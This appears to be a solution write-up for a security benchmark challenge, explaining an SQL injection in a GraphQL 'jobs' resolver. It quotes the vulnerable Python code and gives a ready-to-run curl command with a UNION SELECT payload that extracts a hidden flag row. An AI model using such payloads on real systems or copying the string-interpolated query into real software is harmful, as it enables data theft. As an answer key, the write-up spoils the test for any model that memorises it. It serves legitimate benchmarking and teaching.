# XBEN-038-24 — Simple GraphQL (SQL Injection)

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** SQL Injection via a GraphQL field argument. The `jobs(jobType: String)` resolver
string-concatenates the caller-supplied `job_type` straight into a SQLite query, and the only
guard is a literal equality check on the raw argument (`job_type == 'private'`), which a UNION
payload trivially bypasses.

## Root cause (app/main.py)

```python
@strawberry.field
def jobs(self, _info: Info, job_type: str = "") -> List[Job]:
    conn = get_db_connection()
    cursor = conn.cursor()

    if job_type and job_type == 'private':
        conn.close()
        raise Exception("Only admins can see private jobs")

    if job_type:
        query = f"SELECT * FROM jobs WHERE type = '{job_type}'"   # <-- raw string interpolation
    else:
        query = "SELECT * FROM jobs WHERE type IN ('front-end', 'back-end')"

    cursor.execute(query)
    ...
```

The flag is seeded at container build time into a `jobs` row with `type = 'private'`
(`description` column), which the app intentionally refuses to return when `jobType` is
literally the string `private`. Because the check is a plain string comparison done *before*
the SQL is built, any `jobType` value that isn't literally `"private"` sails through — including
one that contains a UNION SELECT reaching the `private` row at the SQL level.

## Exploit (copy-pasteable, port substituted for this run: 55283)

```bash
PORT=55283
curl -s -X POST http://localhost:$PORT/graphql/ \
  -H "Content-Type: application/json" \
  -d '{"query":"query { jobs(jobType: \"nonexistent'"'"' UNION SELECT * FROM jobs WHERE type='"'"'private'"'"' -- \") { id name type description } }"}'
```

This sends `jobType = "nonexistent' UNION SELECT * FROM jobs WHERE type='private' -- "`, which
is not literally `"private"` (so the app-level guard is bypassed), but builds the SQL query:

```sql
SELECT * FROM jobs WHERE type = 'nonexistent' UNION SELECT * FROM jobs WHERE type='private' --'
```

which unions in the hidden row.
